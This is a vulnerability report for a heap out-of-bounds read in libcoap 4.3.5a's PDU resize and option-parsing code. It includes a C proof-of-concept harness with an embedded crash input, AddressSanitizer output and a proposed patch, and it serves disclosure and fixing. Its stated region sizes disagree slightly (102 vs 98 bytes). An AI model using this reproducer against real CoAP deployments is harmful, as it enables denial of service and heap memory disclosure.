## Vulnerability Report

| Field | Detail |
|-------|--------|
| **Type** | CWE-122: Heap-based Buffer Overflow (Out-of-Bounds Read) |
| **Severity** | **High** — Information disclosure, Denial of Service (crash) |
| **Affected Version** | libcoap v4.3.5a |
| **Root Cause** | `coap_pdu_resize()` unconditionally shrinks `alloc_size` without validating against `used_size` (`src/coap_pdu.c:318`) |

---

## Impact

A heap-buffer-overflow (out-of-bounds read) exists in `coap_opt_parse()` (`src/coap_option.c:51`) that is triggered when a PDU's allocation size is reduced via `coap_pdu_resize()` without properly validating that `used_size` does not exceed the new allocation. This results in `coap_opt_parse()` reading memory beyond the allocated heap buffer when iterating PDU options.

- **Information Disclosure**: OOB read can leak heap contents (adjacent allocations, free list metadata)
- **Denial of Service**: Process crash when ASan is enabled or when the read touches an unmapped page
- **Potential Remote Exploitation**: If an application allows external input to control PDU resize parameters (e.g., via CoAP option processing that triggers internal resize), the OOB read distance (7+ bytes past buffer) could be increased with different input patterns

---

## Description

In `coap_pdu_resize()` at `src/coap_pdu.c:281-319`, the function only handles buffer growth (when `new_size > pdu->alloc_size`), but **unconditionally** updates `pdu->alloc_size` on line 318:

```c
// src/coap_pdu.c:281-319 (v4.3.5a)
int
coap_pdu_resize(coap_pdu_t *pdu, size_t new_size) {
  if (new_size > pdu->alloc_size) {     // ← only handles growth
    // ... realloc to larger size ...
  }
  pdu->alloc_size = new_size;           // ← line 318: ALWAYS updates alloc_size
  return 1;
}
```

When `new_size < pdu->alloc_size`:
1. The `if` block is **skipped** (no `realloc()` occurs)
2. `pdu->alloc_size = new_size` is executed — the recorded size is now **smaller** than the actual buffer
3. `pdu->used_size` may now be **greater** than `pdu->alloc_size`

This creates a dangerous inconsistency. When subsequent operations call `coap_pdu_check_resize()`:

```c
// src/coap_pdu.c:322-337
int coap_pdu_check_resize(coap_pdu_t *pdu, size_t size) {
  if (size > pdu->alloc_size) {          // true because alloc_size was shrunk
    size_t new_size = max(256, pdu->alloc_size * 2);
    // ...
    if (!coap_pdu_resize(pdu, new_size)) // triggers realloc() to smaller size!
      return 0;
  }
  return 1;
}
```

The `realloc()` may actually **shrink** the buffer. When `coap_check_option()` → `coap_option_next()` → `coap_opt_parse()` then iterates options, it reads past the end of the now-shrunken buffer:

```
coap_update_option(pdu, N, ...)
  └→ coap_check_option(pdu, N, &opt_iter)
       └→ coap_option_next(&opt_iter)
            └→ coap_opt_parse(opt, length, &result)    // coap_option.c:51
                 └→ READ *opt → 💥 OOB READ (7 bytes past 102-byte region)
```

---
## POC

```c
/*
 * PoC: Heap-buffer-overflow in coap_opt_parse() via coap_pdu_resize() shrink
 *
 * This self-contained PoC embeds a fuzzer-discovered crash input that triggers
 * a heap-buffer-overflow (OOB read) in coap_opt_parse() (coap_option.c:51).
 * The root cause is that coap_pdu_resize() unconditionally sets alloc_size
 * even when shrinking (coap_pdu.c:318), which can cause a subsequent realloc
 * to shrink the buffer while used_size still references the old larger region.
 *
 * Affected: libcoap v4.3.5a (confirmed)
 * CWE: CWE-122 (Heap-based Buffer Overflow)
 *
 * Compile: clang-18 -g -fsanitize=address,undefined \
 *          -I include -I src -I . \
 *          poc_heap_oob.c .libs/libcoap-3-notls.a -o poc_heap_oob
 *
 * Run:     ./poc_heap_oob
 */
#include "coap3/coap_libcoap_build.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Embedded crash input (419 bytes) */
static const uint8_t crash_data[] = {
  0x00, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0x2c, 0xa9, 0xa9, 0xa9, 0xa9,
  0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xe9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9,
  0xa9, 0xa9, 0xa9, 0xa9, 0x32, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9,
  0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xc0, 0x45, 0xc0, 0xc0,
  0xc0, 0xc0, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xad,
  0xad, 0xad, 0xad, 0xad, 0xad, 0xca, 0xca, 0xca, 0xca, 0xca, 0xca, 0xca,
  0xca, 0xca, 0xca, 0xca, 0xca, 0xca, 0xca, 0xca, 0xca, 0xca, 0xca, 0xca,
  0xca, 0xca, 0xca, 0xca, 0xca, 0xca, 0xca, 0xca, 0xca, 0xca, 0xca, 0xca,
  0xca, 0xca, 0xca, 0xca, 0xca, 0xca, 0xca, 0xca, 0xca, 0xca, 0xca, 0xca,
  0xca, 0xca, 0xca, 0xca, 0xca, 0xad, 0xca, 0xca, 0xca, 0xca, 0xca, 0xca,
  0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9,
  0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0x50, 0x43, 0x4f, 0x4d,
  0x4c, 0x00, 0x00, 0x56, 0x56, 0x3b, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9,
  0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0x89,
  0xa9, 0x00, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0x00, 0xff, 0x4c,
  0xff, 0x00, 0x83, 0x00, 0x00, 0x1c, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9,
  0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9,
  0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9,
  0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9,
  0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9,
  0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9,
  0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9,
  0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9,
  0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0x01, 0x00,
  0x1b, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7,
  0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xd0, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7,
  0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7,
  0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7,
  0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7,
  0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7,
  0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7,
  0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7,
  0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7,
  0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0xc7,
  0xc7, 0xc7, 0xc7, 0xc7, 0xc7, 0x2b, 0x00, 0x21, 0x54, 0x4c, 0x53
};

/* === Harness: exact replica of fuzz_pdu_manip_target.c === */

typedef struct {
  const uint8_t *data;
  size_t remaining;
} fuzz_stream_t;

static uint8_t consume_u8(fuzz_stream_t *s) {
  if (s->remaining == 0) return 0;
  uint8_t v = *s->data; s->data++; s->remaining--;
  return v;
}

static uint16_t consume_u16(fuzz_stream_t *s) {
  uint8_t hi = consume_u8(s);
  uint8_t lo = consume_u8(s);
  return (uint16_t)((hi << 8) | lo);
}

static void run_pdu_manip(const uint8_t *data, size_t size) {
  coap_pdu_t *pdu = NULL;
  coap_pdu_t *dup = NULL;
  coap_context_t *ctx = NULL;
  coap_session_t *session = NULL;
  coap_address_t addr;

  if (size < 8) return;
  coap_startup();
  coap_set_log_level(COAP_LOG_EMERG);

  ctx = coap_new_context(NULL);
  if (!ctx) goto cleanup;
  coap_address_init(&addr);
  addr.addr.sa.sa_family = AF_INET;
  session = coap_new_client_session(ctx, NULL, &addr, COAP_PROTO_UDP);
  if (!session) goto cleanup;

  fuzz_stream_t s = { data, size };

  /* Build initial PDU */
  uint8_t ctrl = consume_u8(&s);
  uint8_t code = consume_u8(&s);
  uint16_t mid = consume_u16(&s);

  coap_pdu_type_t msg_type = (coap_pdu_type_t)(ctrl & 0x03);
  uint8_t init_tok_len = (ctrl >> 2) & 0x07;
  uint16_t init_alloc = ((ctrl >> 5) & 0x07) * 128 + 128;

  pdu = coap_pdu_init(msg_type, code, mid, init_alloc);
  if (!pdu) goto cleanup;

  if (init_tok_len > 0 && init_tok_len <= s.remaining) {
    coap_add_token(pdu, init_tok_len, s.data);
    s.data += init_tok_len; s.remaining -= init_tok_len;
  }

  /* Add initial options */
  uint8_t num_init_opts = consume_u8(&s) % 10;
  uint16_t last_opt = 0;
  for (int i = 0; i < num_init_opts && s.remaining >= 2; i++) {
    uint8_t delta = (consume_u8(&s) & 0x3f) + 1;
    uint8_t olen = consume_u8(&s) % 32;
    uint16_t onum = last_opt + delta;
    if (onum > 65000) onum = 65000;
    if (olen > s.remaining) olen = s.remaining;
    coap_add_option(pdu, onum, olen, s.data);
    s.data += olen; s.remaining -= olen;
    last_opt = onum;
  }

  /* Optionally add payload */
  uint8_t payload_ctrl = consume_u8(&s);
  if ((payload_ctrl & 0x01) && s.remaining > 0) {
    size_t plen = (payload_ctrl >> 1) % 128;
    if (plen > s.remaining) plen = s.remaining;
    if (plen > 0) {
      coap_add_data(pdu, plen, s.data);
      s.data += plen; s.remaining -= plen;
    }
  }

  /* Test 1: PDU Duplicate */
  {
    uint8_t new_tok_len = consume_u8(&s) % 9;
    uint8_t new_tok[8] = {0};
    for (int i = 0; i < new_tok_len && s.remaining > 0; i++)
      new_tok[i] = consume_u8(&s);
    dup = coap_pdu_duplicate(pdu, session, new_tok_len, new_tok, NULL);
    if (dup) { coap_delete_pdu(dup); dup = NULL; }

    coap_opt_filter_t drop;
    memset(&drop, 0, sizeof(drop));
    uint8_t filter_count = consume_u8(&s) % 5;
    for (int i = 0; i < filter_count; i++) {
      uint16_t fopt = consume_u16(&s) % 1000;
      coap_option_filter_set(&drop, fopt);
    }
    dup = coap_pdu_duplicate(pdu, session, pdu->actual_token.length,
                              pdu->actual_token.s, &drop);
    if (dup) { coap_delete_pdu(dup); dup = NULL; }
  }

  /* Test 2: Token update sequence */
  {
    uint8_t num_updates = consume_u8(&s) % 8;
    for (int i = 0; i < num_updates && s.remaining >= 1; i++) {
      uint8_t new_len = consume_u8(&s) % 9;
      uint8_t tok_buf[8] = {0};
      for (int j = 0; j < new_len && s.remaining > 0; j++)
        tok_buf[j] = consume_u8(&s);
      coap_update_token(pdu, new_len, tok_buf);
    }
  }

  /* Test 3: PDU Resize (BUG TRIGGER — resize shrink corrupts alloc_size) */
  {
    uint8_t num_resizes = consume_u8(&s) % 5;
    for (int i = 0; i < num_resizes; i++) {
      uint16_t new_size = consume_u16(&s);
      new_size = (new_size % 8192) + 64;
      coap_pdu_resize(pdu, new_size);  /* ← may shrink alloc_size */

      if (s.remaining >= 2) {
        uint8_t onum_byte = consume_u8(&s);
        uint8_t olen = consume_u8(&s) % 32;
        uint16_t onum = (onum_byte % 50) + 1;
        if (olen > s.remaining) olen = s.remaining;
        coap_insert_option(pdu, onum, olen, s.data);
        s.data += olen; s.remaining -= olen;
      }
    }
  }

  /* Test 4: Insert/Update/Remove (CRASH — OOB read in coap_opt_parse) */
  {
    uint8_t num_ops = consume_u8(&s) % 10;
    for (int i = 0; i < num_ops && s.remaining >= 3; i++) {
      uint8_t op = consume_u8(&s) % 3;
      uint16_t onum = (consume_u8(&s) % 100) + 1;
      uint8_t olen = consume_u8(&s) % 32;
      if (olen > s.remaining) olen = s.remaining;

      switch (op) {
      case 0: coap_insert_option(pdu, onum, olen, s.data); break;
      case 1: coap_update_option(pdu, onum, olen, s.data); break; /* ← CRASH */
      case 2: coap_remove_option(pdu, onum); break;
      }
      s.data += olen; s.remaining -= olen;
    }
  }

  /* Test 5: Encode header */
  coap_pdu_encode_header(pdu, COAP_PROTO_UDP);
  coap_pdu_encode_header(pdu, COAP_PROTO_TCP);

cleanup:
  if (dup) coap_delete_pdu(dup);
  if (pdu) coap_delete_pdu(pdu);
  if (session) coap_session_release(session);
  if (ctx) coap_free_context(ctx);
  coap_cleanup();
}

int main(int argc, char **argv) {
  const uint8_t *data;
  size_t size;

  if (argc >= 2) {
    /* Read crash input from file */
    FILE *f = fopen(argv[1], "rb");
    if (!f) { perror(argv[1]); return 1; }
    fseek(f, 0, SEEK_END);
    size = (size_t)ftell(f);
    fseek(f, 0, SEEK_SET);
    uint8_t *buf = (uint8_t *)malloc(size);
    fread(buf, 1, size, f);
    fclose(f);
    printf("[*] Loaded %zu bytes from %s\n", size, argv[1]);
    run_pdu_manip(buf, size);
    free(buf);
  } else {
    /* Use embedded crash input */
    data = crash_data;
    size = sizeof(crash_data);
    printf("[*] Using embedded crash input (%zu bytes)\n", size);
    printf("[*] Triggering heap-buffer-overflow in coap_opt_parse()...\n\n");
    run_pdu_manip(data, size);
  }

  printf("[+] Done.\n");
  return 0;
}
```

---
## ASan Output:

```shell
[*] Using embedded crash input (419 bytes)
[*] Triggering heap-buffer-overflow in coap_opt_parse()...

=================================================================
==252665==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x50b0000000a9 at pc 0x588aac19b241 bp 0x7fffbee2b3a0 sp 0x7fffbee2b398
READ of size 1 at 0x50b0000000a9 thread T0
    #0 0x588aac19b240 in coap_opt_parse /home/eur1ka/CoAPLab3/libcoap/src/coap_option.c:51:20
    #1 0x588aac19d5aa in coap_option_next /home/eur1ka/CoAPLab3/libcoap/src/coap_option.c:173:15
    #2 0x588aac19e274 in coap_check_option /home/eur1ka/CoAPLab3/libcoap/src/coap_option.c:208:10
    #3 0x588aac1d1f40 in coap_update_option /home/eur1ka/CoAPLab3/libcoap/src/coap_pdu.c:712:12
    #4 0x588aac12eb7d in run_pdu_manip /home/eur1ka/CoAPLab3/libcoap/poc_heap_oob.c:209:15
    #5 0x588aac12cdb6 in main /home/eur1ka/CoAPLab3/libcoap/poc_heap_oob.c:251:5
    #6 0x79f415e29d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #7 0x79f415e29e3f in __libc_start_main csu/../csu/libc-start.c:392:3
    #8 0x588aac055554 in _start (/home/eur1ka/CoAPLab3/libcoap/poc_heap_oob+0x16f554) (BuildId: d9e47d8d4b2cce6f7c806489d3fa530ccdb169fc)

0x50b0000000a9 is located 7 bytes after 98-byte region [0x50b000000040,0x50b0000000a2)
allocated by thread T0 here:
    #0 0x588aac0efb7c in realloc (/home/eur1ka/CoAPLab3/libcoap/poc_heap_oob+0x209b7c) (BuildId: d9e47d8d4b2cce6f7c806489d3fa530ccdb169fc)
    #1 0x588aac145ed7 in coap_realloc_type /home/eur1ka/CoAPLab3/libcoap/src/coap_mem.c:581:9
    #2 0x588aac1c40f1 in coap_pdu_resize /home/eur1ka/CoAPLab3/libcoap/src/coap_pdu.c:298:26
    #3 0x588aac12e57a in run_pdu_manip /home/eur1ka/CoAPLab3/libcoap/poc_heap_oob.c:185:7
    #4 0x588aac12cdb6 in main /home/eur1ka/CoAPLab3/libcoap/poc_heap_oob.c:251:5
    #5 0x79f415e29d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16

SUMMARY: AddressSanitizer: heap-buffer-overflow /home/eur1ka/CoAPLab3/libcoap/src/coap_option.c:51:20 in coap_opt_parse
Shadow bytes around the buggy address:
  0x50affffffe00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x50affffffe80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x50afffffff00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x50afffffff80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x50b000000000: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00
=>0x50b000000080: 00 00 00 00 02[fa]fa fa fa fa fa fa fa fa fa fa
  0x50b000000100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x50b000000180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x50b000000200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x50b000000280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x50b000000300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==252665==ABORTING
```
---

## Suggested Fix

Add a bounds check in `coap_pdu_resize()` to prevent shrinking below `used_size`:

```diff
--- a/src/coap_pdu.c
+++ b/src/coap_pdu.c
@@ -281,6 +281,11 @@ coap_pdu_resize(coap_pdu_t *pdu, size_t new_size) {
   if (new_size > pdu->alloc_size) {
     // ... existing grow logic ...
   }
+  /* Do not shrink below used_size to prevent OOB access */
+  if (new_size < pdu->used_size) {
+    new_size = pdu->used_size;
+  }
   pdu->alloc_size = new_size;
   return 1;
 }
```
